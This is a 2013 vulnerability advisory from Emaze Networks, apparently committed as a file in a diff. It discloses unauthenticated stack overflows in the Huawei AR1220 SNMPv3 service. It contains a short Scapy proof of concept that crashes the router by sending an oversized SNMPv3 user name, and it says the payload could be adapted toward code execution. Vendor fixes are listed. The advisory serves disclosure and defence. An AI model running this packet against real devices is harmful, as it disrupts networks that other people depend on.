@@ -1,0 +1,98 @@
+Multiple buffer overflows on Huawei SNMPv3 service
+==================================================
+
+[ADVISORY INFORMATION]
+Title:    Multiple buffer overflows on Huawei SNMPv3 service
+Discovery date: 11/02/2013
+Release date:   06/05/2013
+Credits:   Roberto Paleari (roberto.paleari@emaze.net, @rpaleari)
+Advisory URL:   http://blog.emaze.net/2013/05/multiple-buffer-overflows-on-huawei.html
+
+[VULNERABILITY INFORMATION]
+Class:           Memory errors
+
+[AFFECTED PRODUCTS]
+We confirm the presence of these security vulnerabilities on the following
+products:
+   * Huawei AR1220 (firmware version V200R002C02SPC121T)
+According to Huawei security advisories [2,3] other products are also
+vulnerable, but they were not checked.
+
+[VULNERABILITY DETAILS]
+The Huawei SNMPv3 service running on the affected devices is vulnerable to
+multiple stack-based buffer overflow issues. These vulnerabilities can be
+exploited by unauthenticated remote attackers.
+
+The issues concern Huawei implementation of the SNMPv3 User-based Security
+Model (USM [1]). Strictly speaking, attackers can overflow the
+"AuthoritativeEngineID" and "UserName" SNMPv3 USM fields.
+
+The vulnerabilities we identified can be classified according to the
+exploitation context: some issues can be triggered only when SNMP debugging is
+enabled, while others are exploitable in the default device configuration.
+
+The first class of issues can be exploited only when SNMP debugging is enabled,
+as they are related with the debugging code that displays the content of
+incoming SNMP packets. Attackers can leverage these issues to achieve RCE, but
+the actual impact is quite low, as SNMP debugging is usually disabled during
+normal operation.
+
+The second class of vulnerabilities affects the SNMPv3 packet decoder.
+Differently than the previous ones, these issues can be exploited in the
+default device configuration. Additionally, it is worth considering that ACLs
+are ineffective at mitigating this threat, as SNMPv3 packets are processed by
+the device even if the sender's IP is not included in the ACL. Similarly, the
+vulnerabilities can be exploited even when no SNMPv3 users are configured.
+
+In the following we include a "proof-of-concept" that exploit the latter
+category. Our PoC simply crashes the device, but the payload can probably be
+also adapted to achieve RCE.
+
+This Python example crashes the device by overflowing the "UserName" SNMPv3 USM
+field. Consider we used a slightly modified version of Python Scapy library to
+properly support the SNMPv3 protocol. The complete Python script and the
+modified Scapy library can be provided upon request.
+
+<cut>
+from scapy.all import *
+
+def main():
+    DST = "192.168.1.1"
+
+    snmp = SNMPv3(version=3)
+    pkt = IP(dst=DST)/UDP(sport=RandShort(), dport=161)/snmp
+    pkt = snmpsetauth(pkt, "emaze", "MD5")
+    pkt["SNMPv3"].flags = 4
+
+    # Replace "user_name" with "auth_engine_id" in the next line to trigger the
+    # other overflow
+    pkt["SNMPv3"].security.user_name = "A"*4096
+
+    pkt.show()
+    send(pkt)
+
+if __name__ == "__main__":
+    main()
+</cut>
+
+[REMEDIATION] 
+The device manufacturer has released updated firmware versions that should
+remediate these issues. Huawei security advisories are available at [2,3].
+
+[COPYRIGHT]
+Copyright(c) Emaze Networks S.p.A 2013, All rights reserved worldwide.
+Permission is hereby granted to redistribute this advisory, providing that no
+changes are made and that the copyright notices and disclaimers remain intact.
+
+[DISCLAIMER]
+Emaze Networks S.p.A is not responsible for the misuse of the information
+provided in our security advisories. These advisories are a service to the
+professional security community. There are NO WARRANTIES with regard to this
+information. Any application or distribution of this information constitutes
+acceptance AS IS, at the user's own risk. This information is subject to change
+without notice.
+
+Footnotes:
+[1] http://www.ietf.org/rfc/rfc2574.txt
+[2] http://www.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-260601.htm
+[3] http://www.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-260626.htm
